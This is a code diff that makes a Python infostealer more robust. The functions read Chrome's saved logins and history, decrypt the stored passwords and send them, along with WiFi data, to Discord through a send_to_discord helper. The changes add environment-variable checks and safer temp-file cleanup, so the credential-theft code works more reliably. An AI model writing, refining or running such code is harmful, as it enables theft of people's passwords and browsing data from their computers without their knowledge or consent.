@@ -59,14 +59,19 @@ def extract_wifi():
         send_to_discord("wifi.txt", wifi_data)
 
 def extract_chrome_passwords():
+    temp_path = None
     try:
-        data_path = os.path.join(os.getenv('LOCALAPPDATA'), 
-                               'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
+        localappdata = os.getenv('LOCALAPPDATA')
+        if not localappdata:
+            return
+        data_path = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
         if not os.path.exists(data_path):
             return
 
-        # Create temporary copy to avoid locking issues
-        temp_path = os.path.join(os.getenv('TEMP'), 'chrome_temp.db')
+        temp_env = os.getenv('TEMP')
+        if not temp_env:
+            return
+        temp_path = os.path.join(temp_env, 'chrome_temp.db')
         open(temp_path, 'a').close()  # Create empty file if doesn't exist
         with open(data_path, 'rb') as f1, open(temp_path, 'wb') as f2:
             f2.write(f1.read())
@@ -74,7 +79,7 @@ def extract_chrome_passwords():
         conn = sqlite3.connect(temp_path)
         cursor = conn.cursor()
         cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-        
+
         passwords = ""
         for site, user, encrypted_pass in cursor.fetchall():
             try:
@@ -82,20 +87,22 @@ def extract_chrome_passwords():
                 passwords += f"URL: {site}\nUser: {user}\nPass: {decrypted.decode('utf-8')}\n---\n"
             except:
                 continue
-                
+
         if passwords:
             send_to_discord("chrome_passwords.txt", passwords)
-            
+
     except Exception as e:
         pass
     finally:
-        if 'temp_path' in locals() and os.path.exists(temp_path):
+        if temp_path and os.path.exists(temp_path):
             os.remove(temp_path)
 
 def extract_chrome_history():
     try:
-        history_db = os.path.join(os.getenv('LOCALAPPDATA'), 
-                                'Google', 'Chrome', 'User Data', 'Default', 'history')
+        localappdata = os.getenv('LOCALAPPDATA')
+        if not localappdata:
+            return
+        history_db = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'history')
         if not os.path.exists(history_db):
             return
 
